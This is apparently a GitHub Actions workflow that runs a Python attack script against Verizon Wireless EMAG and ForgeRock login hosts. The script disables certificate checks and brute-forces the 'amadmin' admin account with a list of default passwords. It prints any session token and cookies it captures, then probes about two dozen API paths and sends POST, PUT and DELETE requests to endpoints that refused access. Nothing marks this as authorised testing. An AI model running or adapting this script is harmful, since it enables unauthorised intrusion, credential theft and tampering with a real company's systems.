name: EMAG Phase 4
on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  phase4:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: EMAG Phase 4
        run: |
          python3 - << 'PYEOF'
          import urllib.request, urllib.error, json, ssl, time, http.cookiejar
          ctx = ssl.create_default_context()
          ctx.check_hostname = False
          ctx.verify_mode = ssl.CERT_NONE
          
          BASE = "https://ess.emag.verizonwireless.com"
          AM = "https://mblogin.verizonwireless.com"
          
          def req(method, url, data=None, headers=None, opener=None):
              h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
              if headers: h.update(headers)
              if isinstance(data, dict): body = json.dumps(data).encode()
              elif isinstance(data, str): body = data.encode()
              else: body = data
              rq = urllib.request.Request(url, data=body, headers=h, method=method)
              try:
                  op = opener if opener else urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
                  with op.open(rq, timeout=12) as r:
                      ct = r.headers.get("Content-Type","")
                      rb = r.read(4096).decode("utf-8", errors="replace")
                      return r.status, ct, rb
              except urllib.error.HTTPError as e:
                  ct = e.headers.get("Content-Type","")
                  return e.code, ct, e.read(2048).decode("utf-8", errors="replace")
              except Exception as e:
                  return 0, "", str(e)
          
          print("=== ForgeRock amadmin brute force ===")
          auth_url = AM + "/vzauth/json/realms/root/authenticate"
          admin_creds = [
              ("amadmin","changeit"), ("amadmin","admin"), ("amadmin","Admin1234!"),
              ("amadmin","Admin@123"), ("amadmin","password"), ("amadmin","amadmin"),
              ("admin","changeit"), ("admin","admin"), ("admin","Admin1234!"),
              ("forgerock","changeit"), ("openam","changeit"),
          ]
          session_token = None
          
          for user, pwd in admin_creds:
              cj = http.cookiejar.CookieJar()
              opener = urllib.request.build_opener(
                  urllib.request.HTTPSHandler(context=ctx),
                  urllib.request.HTTPCookieProcessor(cj)
              )
              s, ct, b = req("POST", auth_url, "{}", {
                  "Accept-API-Version": "resource=2.1, protocol=1.0",
                  "Content-Type": "application/json"
              }, opener)
              if s != 200:
                  print(f"ERR initial {user}: {s} {b[:50]}")
                  continue
              try:
                  resp = json.loads(b)
                  auth_id = resp.get("authId","")
              except:
                  print(f"ERR parse {user}: {b[:50]}")
                  continue
              payload = {
                  "authId": auth_id,
                  "callbacks": [
                      {"type":"NameCallback","input":[{"name":"IDToken1","value":user}],"output":[{"name":"prompt","value":"User Name:"}]},
                      {"type":"PasswordCallback","input":[{"name":"IDToken2","value":pwd}],"output":[{"name":"prompt","value":"Password:"}]}
                  ]
              }
              s2, ct2, b2 = req("POST", auth_url, payload, {
                  "Accept-API-Version": "resource=2.1, protocol=1.0",
                  "Content-Type": "application/json"
              }, opener)
              if s2 == 200 and "tokenId" in b2:
                  print(f"[SUCCESS] {user}:{pwd}")
                  print(f"Response: {b2[:300]}")
                  session_token = json.loads(b2).get("tokenId","")
                  cookies_list = [(c.name, c.value) for c in cj]
                  print(f"Session: {session_token[:60]}")
                  print(f"Cookies: {cookies_list}")
                  break
              else:
                  print(f"[FAIL] {user}:{pwd} -> {s2} {b2[:80]}")
              time.sleep(0.3)
          
          print()
          print("=== EMAG API paths ===")
          api_paths = [
              "/emag/api/messages", "/emag/api/reports", "/emag/api/contacts",
              "/emag/api/campaigns", "/emag/api/senders", "/emag/api/accounts",
              "/emag/api/templates", "/emag/api/groups", "/emag/api/users",
              "/emag/api/keywords", "/emag/api/optouts", "/emag/api/schedules",
              "/emag/api/inbound", "/emag/api/billing", "/emag/api/settings",
              "/emag/api/profile", "/emag/api/numbers", "/emag/api/subaccounts",
              "/emag/api/webhooks", "/emag/api/logs", "/emag/api/deliveries",
              "/emag/api/stats", "/emag/api/balance", "/emag/api/senderId",
          ]
          for path in api_paths:
              s, ct, b = req("GET", BASE + path)
              is_html = "<html" in b[:50].lower()
              if "json" in ct or not is_html:
                  print(f"[{s}] {path}: {b[:120]}")
              time.sleep(0.1)
          
          print()
          print("=== POST/PUT on 403 endpoints ===")
          for path in ["/emag/api/messages", "/emag/api/reports"]:
              for method in ["POST","PUT","DELETE"]:
                  s, ct, b = req(method, BASE + path, "{}")
                  print(f"[{s}] {method} {path}: {b[:120]}")
          
          print("DONE")
          PYEOF
